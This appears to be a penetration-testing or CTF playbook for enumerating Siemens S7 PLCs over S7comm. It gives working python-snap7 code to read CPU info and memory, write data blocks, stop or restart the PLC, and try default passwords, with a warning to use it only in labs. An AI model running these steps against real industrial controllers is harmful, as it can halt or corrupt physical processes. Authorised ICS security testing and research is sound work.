# Siemens S7comm — PLC Enumeration

## When this applies

- Target speaks S7comm (Siemens proprietary protocol) over TCP/102 (ISO-on-TCP).
- Goal is to enumerate Siemens S7-300/400/1200/1500 PLCs, read CPU info and data blocks, and (when appropriate) issue start/stop commands.

## Technique

S7comm sits on top of ISO 8073/COTP at TCP/102. Connection setup requires negotiating COTP TPDU sizes and S7comm parameters, then specifying the target rack/slot (typically rack 0, slot 2 for S7-300/400; slot 1 for S7-1200/1500). After connect, standard read/write requests target Data Blocks (DB), Inputs (I), Outputs (Q), Merkers/flags (M), and Timers/Counters.

## Steps

### 1. Identify S7-capable hosts

```bash
# nmap NSE for S7
nmap -p 102 --script s7-info TARGET
```

S7 banner reveals: PLC type (S7-300, S7-1200, S7-1500), firmware version, module name, plant/serial number.

### 2. Connect with python-snap7

```python
import snap7
from snap7 import util

client = snap7.client.Client()
# rack=0, slot=2 for S7-300/400; slot=1 for S7-1200/1500
client.connect(HOST, 0, 2)

# CPU info
cpu = client.get_cpu_info()
print(cpu.ModuleTypeName, cpu.SerialNumber, cpu.ASName, cpu.Copyright, cpu.ModuleName)

# Order code, version
order = client.get_order_code()
print(order)

# CPU state (Run / Stop)
state = client.get_cpu_state()
print(state)
```

### 3. Read Data Blocks (DBs)

```python
# DB1 first 100 bytes
data = client.db_read(1, 0, 100)
print(data.hex())

# Decode known offsets
real_value = util.get_real(data, 0)        # 4-byte IEEE float at offset 0
int_value  = util.get_int(data, 4)         # 2-byte signed int at offset 4
str_value  = util.get_string(data, 6)      # S7 STRING at offset 6
```

DB1, DB2, ... contain user variables. Common pattern: process variables in DB1, recipe data in DB10, etc.

### 4. Read Inputs (I), Outputs (Q), Memory (M)

```python
# Process Image Inputs (PII), bytes 0-15
inputs = client.read_area(snap7.types.Areas.PE, 0, 0, 16)

# Process Image Outputs (PIQ), bytes 0-15
outputs = client.read_area(snap7.types.Areas.PA, 0, 0, 16)

# Merker (memory bits / flags), bytes 0-31
merker = client.read_area(snap7.types.Areas.MK, 0, 0, 32)
```

### 5. Write to a DB

```python
# Modify DB1 byte 0 to 1 (boolean true)
data = bytearray(client.db_read(1, 0, 4))
util.set_int(data, 0, 9999)
client.db_write(1, 0, data)
```

### 6. Run / Stop the PLC

```python
# Stop PLC (halts user program — DESTRUCTIVE)
client.plc_stop()

# Cold start
client.plc_cold_start()

# Hot start
client.plc_hot_start()
```

⚠ Stopping a production PLC halts the controlled process. Only use in lab/CTF environments or with explicit operator authorization.

### 7. List all DBs (S7-300/400)

```python
# List blocks of type DB
db_list = client.list_blocks_of_type(snap7.types.BlockTypes.DB, 0x10000)
print(db_list)   # array of DB numbers
```

S7-1200/1500 use protected blocks more aggressively — list_blocks may be partial or denied.

### 8. Authentication on S7-1200 / S7-1500

Newer Siemens PLCs (S7-1200 v4+, S7-1500) implement an authentication layer:

- **Read access password** — required to read DBs in protected mode
- **Write access password** — required to write
- **Full access password** — required to start/stop CPU

Default password = empty. If a password is set, authentication is performed during connect (NSDU0_AC negotiation). Tools like `s7scan`, `plcscan`, or PLC-PoX scripts attempt default/empty creds.

### 9. Custom S7 packet crafting (advanced)

When python-snap7 is too high-level (e.g., to fuzz or replay specific frames):

```python
from scapy.contrib.s7comm import S7CommPlus, S7Header
# Build TPKT/COTP/S7 frames manually for fuzzing or replay
```

## Verifying success

- CPU info returned (ModuleTypeName, ASName, etc.) confirms successful S7 handshake.
- DB read returns expected payload (e.g., recipe data, setpoints, ASCII flag).
- For lab targets: PLC state changes observable via HMI or process behavior.

## Common pitfalls

- **Wrong rack/slot** — S7-300/400 default to (0, 2); S7-1200/1500 use (0, 1). Try both if unsure.
- **Password-protected PLCs** reject DB reads/writes silently or with a generic permission error.
- **Process Image Inputs (PE)** are read-only; writing returns an error. Use the right area code.
- **Sustained-write needed** for actuator coils — PLC scan cycle resets manually-set values within ~ms unless the program is halted.
- **Some firmware versions** require a magic "PG" connection type (programming device) vs "OP" (operator panel) vs "Basic" — python-snap7 defaults to PG, which is typically the most permissive.
- **S7-1200/1500 access protection** can be set so even read access requires the password — even basic enumeration fails.

## Tools

- python-snap7 (Python wrapper for snap7 C library)
- snap7 (Davide Nardella's reference C library)
- nmap NSE: `s7-info`
- s7scan, plcscan (Python scanners)
- Wireshark (S7comm dissector built-in — invaluable for understanding observed traffic)
- PLCinject (Ralf Spenneberg's S7 firmware/program injector — research only)
